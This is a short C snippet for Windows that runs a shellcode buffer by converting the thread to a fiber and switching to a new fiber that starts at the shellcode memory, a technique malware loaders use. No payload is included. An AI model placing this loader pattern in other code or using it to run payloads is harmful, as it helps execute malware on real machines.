

void execute(PVOID shellcode_mem) {
    PVOID main_fiber = ConvertThreadToFiber(NULL);
    PVOID shellcode_fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)shellcode_mem, NULL);
    SwitchToFiber(shellcode_fiber);
}
